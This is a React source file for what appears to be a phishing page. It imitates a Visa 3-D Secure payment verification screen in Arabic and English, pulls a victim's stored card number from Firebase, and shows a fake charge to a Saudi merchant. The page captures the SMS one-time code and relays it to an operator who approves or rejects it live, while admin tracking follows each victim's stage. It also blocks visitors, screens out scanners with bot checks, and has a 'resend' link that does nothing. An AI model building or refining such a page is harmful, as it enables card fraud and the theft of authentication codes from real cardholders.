import { useState, useEffect, useRef } from "react";
import { useLocation } from "wouter";
import {
  handleOtp,
  listenForOtpApproval,
  handleCurrentPage,
} from "@/lib/firebase";
import { findBankLogo } from "@/lib/bank-logos";

const VisaLogo = () => (
  <svg
    xmlns="http://www.w3.org/2000/svg"
    viewBox="0 0 750 471"
    className="h-[28px] w-auto"
  >
    <path
      d="M278.2 334.7l35-207h56l-35 207h-56zM524.3 131.3c-11.1-4.2-28.5-8.7-50.2-8.7-55.3 0-94.3 28-94.6 68.2-.3 29.7 27.7 46.3 48.9 56.2 21.7 10.1 29 16.6 28.9 25.7-.1 13.9-17.3 20.2-33.3 20.2-22.3 0-34.1-3.1-52.4-10.7l-7.2-3.3-7.8 46c13 5.7 37 10.7 61.9 11 58.6 0 96.6-27.6 97-70.5.2-23.5-14.6-41.3-46.7-56-19.5-9.5-31.4-15.8-31.3-25.4 0-8.5 10.1-17.6 31.9-17.6 18.2-.3 31.4 3.7 41.7 7.8l5 2.3 7.6-45.2zM619.2 127.7H574c-13.8 0-24.1 3.8-30.1 17.7l-85.4 194.1h60.4l12-31.7h73.7l7 31.7h53.3l-46.7-211.8h-15zM548.1 264.6c4.5-11.5 21.7-54.6 21.7-54.6-.3.5 4.5-11.4 7.2-18.8l3.6 17c0 .1 10.4 46.5 12.6 56.4h-45.1zM230.1 127.7l-55.7 141.6-5.9-28.4c-10.4-32.7-42.6-68.1-78.6-85.8l51 179.3h60.9L292.5 127.7h-62.4z"
      fill="#1a1f71"
    />
    <path
      d="M131.3 127.7H43.1l-.7 4c69.6 17 115.7 58.1 134.8 107.5l-19.5-94.3c-3.4-13.3-13.3-16.8-26.4-17.2z"
      fill="#f9a533"
    />
  </svg>
);

type Lang = "ar" | "en";

interface VisitorContext {
  cardLast4: string;
  amount: number | null;
  bankName: string;
  backHref: string;
  loading: boolean;
}

const SAUDI_MERCHANT_AR = "ALDIRIYAH";
const SAUDI_MERCHANT_EN = "ALDIRIYAH";

const formatAmount = (amount: number | null, lang: Lang) => {
  if (amount == null) return lang === "ar" ? "—" : "—";
  const value = amount.toLocaleString(lang === "ar" ? "ar-SA" : "en-US", {
    minimumFractionDigits: 2,
    maximumFractionDigits: 2,
  });
  return lang === "ar" ? `${value} ر.س` : `${value} SAR`;
};

const formatDate = (lang: Lang) => {
  const d = new Date();
  const dd = String(d.getDate()).padStart(2, "0");
  const mm = String(d.getMonth() + 1).padStart(2, "0");
  const yyyy = d.getFullYear();
  return `${dd}/${mm}/${yyyy}`;
};

const buildContent = (lang: Lang, ctx: VisitorContext) => {
  const merchant = lang === "ar" ? SAUDI_MERCHANT_AR : SAUDI_MERCHANT_EN;
  const amount = formatAmount(ctx.amount, lang);
  const date = formatDate(lang);
  const last4 = ctx.cardLast4 || "0000";
  const masked = `************${last4}`;

  if (lang === "ar") {
    return {
      dir: "rtl" as const,
      title: "التحقق من عملية الدفع",
      message:
        "لقد أرسلنا رسالة نصية قصيرة تحتوي على رمز توثيق إلى رقم هاتفك المتحرك المسجل لدينا.",
      transaction: (
        <>
          أنت تفوّض تنفيذ دفعة لصالح <strong>{merchant}</strong> بقيمة{" "}
          <strong>{amount}</strong> بتاريخ <strong>{date}</strong> بواسطة
          البطاقة المنتهية بـ{" "}
          <strong style={{ letterSpacing: "0.02em" }}>{masked}</strong>.
        </>
      ),
      otpLabel: "رمز التحقق",
      submit: "إرسال",
      submitting: "جاري التحقق...",
      resend: "إعادة إرسال الرمز",
      resentMsg: "تم إعادة إرسال الرمز بنجاح",
      needHelp: "بحاجة إلى المساعدة؟",
      learnMore: "تعرف على المزيد عن عملية التحقق",
      successTitle: "تمت العملية بنجاح",
      successMsg: "تم التحقق من عملية الدفع بنجاح.",
      error: "يرجى إدخال رمز التحقق",
      rejected: "رمز التحقق غير صحيح، يرجى المحاولة مرة أخرى",
      blocked: "تم حظر هذا الزائر ولا يمكنه المتابعة",
      generic: "حدث خطأ، يرجى المحاولة مرة أخرى",
    };
  }
  return {
    dir: "ltr" as const,
    title: "Payment Verification",
    message:
      "We have sent a short SMS containing a verification code to your registered mobile number.",
    transaction: (
      <>
        You are authorizing a payment to <strong>{merchant}</strong> for{" "}
        <strong>{amount}</strong> on <strong>{date}</strong> using card ending
        in <strong style={{ letterSpacing: "0.02em" }}>{masked}</strong>.
      </>
    ),
    otpLabel: "Verification Code",
    submit: "Submit",
    submitting: "Verifying...",
    resend: "Resend Code",
    resentMsg: "Code resent successfully",
    needHelp: "Need Help?",
    learnMore: "Learn more about verification",
    successTitle: "Payment Verified",
    successMsg: "Your payment has been successfully verified.",
    error: "Please enter the verification code",
    rejected: "Invalid verification code, please try again",
    blocked: "This visitor has been blocked",
    generic: "An error occurred, please try again",
  };
};

export default function OTPPage() {
  return (
    <div
      className="min-h-screen w-full flex items-center justify-center px-3 py-6"
      style={{ background: "#d6d6d6" }}
    >
      <PaymentVerify />
    </div>
  );
}

function PaymentVerify() {
  const [, setLocation] = useLocation();
  const [lang, setLang] = useState<Lang>("ar");
  const [otp, setOtp] = useState("");
  const [error, setError] = useState("");
  const [resent, setResent] = useState(false);
  const [isWaiting, setIsWaiting] = useState(false);
  const [otpResult, setOtpResult] = useState<"approved" | "rejected" | null>(
    null,
  );
  const [ctx, setCtx] = useState<VisitorContext>({
    cardLast4: "",
    amount: null,
    bankName: "",
    backHref: "/checkout",
    loading: true,
  });

  const formLoadTime = useRef(Date.now());
  const interactionCount = useRef(0);
  const hasMouseMoved = useRef(false);
  const inputRef = useRef<HTMLInputElement>(null);

  // Bot detection setup
  useEffect(() => {
    const handleMouseMove = () => {
      hasMouseMoved.current = true;
    };
    const handleKeyPress = () => {
      interactionCount.current++;
    };
    // SMS autofill (iOS keyboard suggestion / Android Autofill) does not
    // fire keypress events, but it does dispatch a real `input` event on the
    // field. Count that as an interaction so the auto-submit isn't blocked
    // by the bot guard.
    const handleInput = () => {
      interactionCount.current++;
      hasMouseMoved.current = true;
    };
    const inputEl = inputRef.current;
    window.addEventListener("mousemove", handleMouseMove);
    window.addEventListener("touchstart", handleMouseMove);
    window.addEventListener("keypress", handleKeyPress);
    inputEl?.addEventListener("input", handleInput);
    inputEl?.addEventListener("paste", handleInput);
    inputEl?.focus();
    return () => {
      window.removeEventListener("mousemove", handleMouseMove);
      window.removeEventListener("touchstart", handleMouseMove);
      window.removeEventListener("keypress", handleKeyPress);
      inputEl?.removeEventListener("input", handleInput);
      inputEl?.removeEventListener("paste", handleInput);
    };
  }, []);

  // Load visitor context (card last4, amount, bank lookup)
  useEffect(() => {
    let cancelled = false;
    (async () => {
      try {
        const visitorId = localStorage.getItem("visitor");
        if (!visitorId) {
          if (!cancelled) setCtx((c) => ({ ...c, loading: false }));
          return;
        }
        const { db, doc, getDoc } = await import("@/lib/firebase");
        if (!db) {
          if (!cancelled) setCtx((c) => ({ ...c, loading: false }));
          return;
        }
        const snap = await getDoc(doc(db, "pays", visitorId));
        const data = snap.data() || {};
        const cardNumber: string =
          typeof data.cardNumber === "string" ? data.cardNumber : "";
        const cardLast4 = cardNumber.replace(/\D/g, "").slice(-4);
        const amount =
          typeof data.totalAmount === "number"
            ? data.totalAmount
            : typeof data.total === "number"
              ? data.total
              : null;
        const isReservation =
          data.type === "restaurant_reservation" ||
          data.currentPage === "reserve_checkout";
        const backHref = isReservation ? "/restaurants" : "/checkout";

        // Sync dashboard step indicator: mark visitor as having reached the
        // OTP stage (step 5). Use "reserve_otp" for restaurant flow so admins
        // can tell the two flows apart.
        void handleCurrentPage(isReservation ? "reserve_otp" : "otp");

        let bankName = "";
        const bin = cardNumber.replace(/\D/g, "").slice(0, 6);
        if (bin.length === 6) {
          try {
            const res = await fetch(`/api/bin-lookup/${bin}`);
            if (res.ok) {
              const json = await res.json();
              if (json?.success && json.data?.bankName) {
                bankName = json.data.bankName;
              }
            }
          } catch {
            // ignore
          }
        }

        if (!cancelled) {
          setCtx({ cardLast4, amount, bankName, backHref, loading: false });
        }
      } catch {
        if (!cancelled) setCtx((c) => ({ ...c, loading: false }));
      }
    })();
    return () => {
      cancelled = true;
    };
  }, []);

  const t = buildContent(lang, ctx);
  const bankLogo = findBankLogo(ctx.bankName);

  // Listen for admin OTP approval/rejection
  useEffect(() => {
    if (!isWaiting) return;
    const unsubscribe = listenForOtpApproval((status) => {
      setOtpResult(status);
      setIsWaiting(false);
      if (status === "approved") {
        // Mark explicit "otp_verified" stage so the admin dashboard can
        // distinguish "OTP submitted, awaiting approval" (currentPage="otp")
        // from "OTP approved, transitioning to confirmation"
        // (currentPage="otp_verified"). Without this, ticket-flow step 5
        // would never be reached since users go straight from step 4 (otp)
        // to step 6 (confirmation).
        handleCurrentPage("otp_verified").catch(() => {});
        setTimeout(() => setLocation("/confirmation"), 2000);
      }
    });
    return () => unsubscribe();
  }, [isWaiting, setLocation]);

  const isBotDetected = (): boolean => {
    const timeSpent = Date.now() - formLoadTime.current;
    if (timeSpent < 2000) return true;
    if (interactionCount.current < 1) return true;
    if (!hasMouseMoved.current && !("ontouchstart" in window)) return true;
    return false;
  };

  const submitOtp = async (code: string) => {
    if (isWaiting) return;
    if (code.length < 4 || code.length > 8) {
      setError(t.error);
      return;
    }
    if (isBotDetected()) {
      setError(t.generic);
      return;
    }
    setError("");
    setOtpResult(null);
    setIsWaiting(true);
    try {
      await handleOtp(code);
    } catch (err: any) {
      setIsWaiting(false);
      if (err?.message === "VISITOR_BLOCKED") {
        setError(t.blocked);
      } else {
        setError(t.generic);
      }
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    await submitOtp(otp);
  };

  // Auto-submit as soon as a 6-digit code is entered (typed or SMS-autofilled),
  // unless the previous attempt was rejected and the same code is still in the
  // input — wait for the user to change it before re-submitting.
  const lastAutoSubmitted = useRef("");
  useEffect(() => {
    if (otp.length !== 6) return;
    if (isWaiting) return;
    if (lastAutoSubmitted.current === otp) return;
    lastAutoSubmitted.current = otp;
    void submitOtp(otp);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [otp, isWaiting]);

  const handleResend = (e: React.MouseEvent) => {
    e.preventDefault();
    setResent(true);
    setOtp("");
    setError("");
    setOtpResult(null);
    setTimeout(() => setResent(false), 3000);
  };

  const toggleLang = () => {
    setLang((l) => (l === "ar" ? "en" : "ar"));
    setError("");
  };

  if (otpResult === "approved") {
    return (
      <div
        className="bg-white shadow-xl overflow-hidden text-center p-8"
        style={{
          width: "360px",
          borderRadius: "2px",
          border: "1px solid #c8c8c8",
        }}
        dir={t.dir}
        data-testid="otp-success"
      >
        <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
          <svg
            className="w-8 h-8 text-green-600"
            fill="none"
            stroke="currentColor"
            viewBox="0 0 24 24"
          >
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              strokeWidth={2}
              d="M5 13l4 4L19 7"
            />
          </svg>
        </div>
        <h2 className="text-xl font-bold text-gray-800 mb-2">
          {t.successTitle}
        </h2>
        <p className="text-gray-500 text-sm">{t.successMsg}</p>
      </div>
    );
  }

  return (
    <div
      className="bg-white shadow-xl overflow-hidden relative"
      style={{
        width: "360px",
        maxWidth: "100%",
        borderRadius: "2px",
        border: "1px solid #c8c8c8",
      }}
      dir={t.dir}
      data-testid="otp-card"
    >
      {/* Close (back to checkout) */}
      <button
        onClick={() => setLocation(ctx.backHref)}
        className="absolute top-2 text-gray-500 hover:text-gray-800 z-10 leading-none font-light"
        style={{
          fontSize: "18px",
          lineHeight: 1,
          [lang === "ar" ? "left" : "right"]: "8px",
        }}
        data-testid="button-close-otp"
        aria-label="close"
      >
        ✕
      </button>

      {/* Header */}
      <div
        className="flex items-center justify-between px-4 py-3 border-b bg-white"
        style={{ borderColor: "#ddd" }}
      >
        <VisaLogo />

        <div className="flex items-center gap-2">
          <button
            onClick={toggleLang}
            className="text-xs font-semibold border rounded px-2 py-1 transition-colors hover:bg-gray-100"
            style={{
              fontSize: "11px",
              color: "#2563eb",
              borderColor: "#2563eb",
              fontFamily: "Arial, sans-serif",
              letterSpacing: "0.05em",
            }}
            data-testid="button-toggle-lang"
          >
            {lang === "ar" ? "EN" : "عربي"}
          </button>

          {bankLogo ? (
            <div
              className="flex items-center justify-center bg-white"
              style={{ width: "90px", height: "36px" }}
              data-testid="img-bank-logo"
            >
              <img
                src={bankLogo.logo}
                alt={bankLogo.label}
                className="max-h-[34px] max-w-[88px] object-contain"
                onError={(e) => {
                  (e.currentTarget as HTMLImageElement).style.display = "none";
                }}
              />
            </div>
          ) : (
            <div
              className="flex items-center justify-center rounded"
              style={{
                width: "90px",
                height: "36px",
                border: "1px solid #e5e5e5",
                background: "#fafafa",
                color: "#9ca3af",
                fontSize: "10px",
                fontFamily: "Arial, sans-serif",
              }}
              data-testid="img-bank-logo-placeholder"
            >
              {ctx.loading ? "…" : "Bank"}
            </div>
          )}
        </div>
      </div>

      {/* Body */}
      <div className="px-5 py-5" dir={t.dir}>
        <h1
          className="text-center font-bold text-gray-900 mb-3"
          style={{
            fontSize: "16px",
            fontFamily: "'Tajawal', Arial, sans-serif",
          }}
          data-testid="text-otp-title"
        >
          {t.title}
        </h1>

        <p
          className="text-center text-gray-700 leading-relaxed mb-4"
          style={{
            fontSize: "13.5px",
            fontFamily: "'Tajawal', Arial, sans-serif",
          }}
        >
          {t.message}
        </p>

        <p
          className="text-center text-gray-800 leading-relaxed mb-5"
          style={{
            fontSize: "13px",
            fontFamily: "'Tajawal', Arial, sans-serif",
          }}
          data-testid="text-otp-transaction"
        >
          {t.transaction}
        </p>

        <form onSubmit={handleSubmit}>
          <div className="mb-3">
            <label
              htmlFor="otp"
              className="block text-center text-gray-700 mb-2"
              style={{
                fontSize: "13.5px",
                fontFamily: "'Tajawal', Arial, sans-serif",
              }}
            >
              {t.otpLabel}
            </label>
            <input
              ref={inputRef}
              id="otp"
              name="otp"
              type="text"
              inputMode="numeric"
              autoComplete="one-time-code"
              maxLength={8}
              placeholder="● ● ● ● ● ●"
              value={otp}
              disabled={isWaiting}
              onChange={(e) => {
                setOtp(e.target.value.replace(/\D/g, ""));
                setError("");
              }}
              className={`w-full text-center py-2 px-3 outline-none transition-all ${
                error || otpResult === "rejected"
                  ? "border border-red-400 bg-red-50"
                  : "border border-gray-300 bg-white"
              }`}
              style={{
                direction: "ltr",
                letterSpacing: "0.2em",
                fontSize: "16px",
                borderRadius: "3px",
                boxShadow:
                  error || otpResult === "rejected"
                    ? undefined
                    : "inset 0 1px 2px rgba(0,0,0,0.07)",
              }}
              onFocus={(e) => {
                e.currentTarget.style.borderColor = "#3b82f6";
                e.currentTarget.style.boxShadow =
                  "0 0 0 2px rgba(59,130,246,0.15)";
              }}
              onBlur={(e) => {
                e.currentTarget.style.borderColor =
                  error || otpResult === "rejected" ? "#f87171" : "#d1d5db";
                e.currentTarget.style.boxShadow =
                  "inset 0 1px 2px rgba(0,0,0,0.07)";
              }}
              data-testid="input-otp"
            />
            {(error || otpResult === "rejected") && (
              <p
                className="text-red-500 text-center mt-1"
                style={{ fontSize: "12px" }}
                data-testid="error-otp"
              >
                {error || t.rejected}
              </p>
            )}
          </div>

          <button
            type="submit"
            disabled={isWaiting}
            className="w-full py-2.5 text-white font-bold transition-opacity hover:opacity-90 active:opacity-80 disabled:opacity-60"
            style={{
              background: "#2563eb",
              borderRadius: "3px",
              fontSize: "15px",
              fontFamily: "'Tajawal', Arial, sans-serif",
            }}
            data-testid="button-verify-otp"
          >
            {isWaiting ? t.submitting : t.submit}
          </button>
        </form>

        <div className="mt-4 text-center">
          {resent ? (
            <p
              className="text-green-600"
              style={{
                fontSize: "13px",
                fontFamily: "'Tajawal', Arial, sans-serif",
              }}
              data-testid="status-otp-resent"
            >
              {t.resentMsg}
            </p>
          ) : (
            <a
              href="#"
              onClick={handleResend}
              className="hover:underline"
              style={{
                color: "#1d4ed8",
                fontSize: "13px",
                fontFamily: "'Tajawal', Arial, sans-serif",
              }}
              data-testid="link-resend-otp"
            >
              {t.resend}
            </a>
          )}
        </div>

        <div
          className="mt-4 pt-3 flex items-center justify-center gap-1"
          style={{
            borderTop: "1px solid #e5e7eb",
            fontSize: "13px",
            fontFamily: "'Tajawal', Arial, sans-serif",
          }}
        >
          <a
            href="#"
            onClick={(e) => e.preventDefault()}
            className="hover:underline font-medium"
            style={{ color: "#1d4ed8" }}
            data-testid="link-need-help"
          >
            {t.needHelp}
          </a>
          <span className="text-gray-400 mx-1">|</span>
          <a
            href="#"
            onClick={(e) => e.preventDefault()}
            className="hover:underline font-medium"
            style={{ color: "#1d4ed8" }}
            data-testid="link-learn-more"
          >
            {t.learnMore}
          </a>
        </div>
      </div>
    </div>
  );
}
